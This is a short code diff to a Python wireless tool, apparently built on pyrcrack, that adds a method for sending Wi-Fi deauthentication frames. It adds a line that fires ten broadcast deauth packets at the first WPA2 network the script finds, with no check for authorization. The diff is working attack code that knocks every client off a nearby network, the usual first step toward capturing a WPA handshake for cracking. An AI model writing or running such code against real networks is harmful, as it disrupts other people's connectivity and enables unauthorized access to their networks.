@@ -30,6 +30,16 @@ class Atol:
         self.networks = out
         return out
     
+    async def deauthenticate_target(self, bssid: str, client: str, count: int = 5):
+        airmon = pyrcrack.AirmonNg()
+        interfaces = await airmon.interfaces
+        interface = interfaces[0]
+
+        async with airmon(interface) as mon:
+            async with pyrcrack.AireplayNg() as preplay:
+                async with preplay(mon.monitor_interface) as replay:
+                    await replay.deauth(bssid=bssid, client=client, count=count)
+    
     def analyze_networks(self):
         for n in self.networks:
             if n["essid"] and n["encryption"] == "WPA+PSK/WPA+AES-CCM":
@@ -48,3 +58,5 @@ c.clear()
 networks = a.get_wpa2_networks()
 for n in networks:
     print(n)
+
+asyncio.run(a.deauthenticate_target(bssid=networks[0]["bssid"], client="FF:FF:FF:FF:FF:FF", count=10))
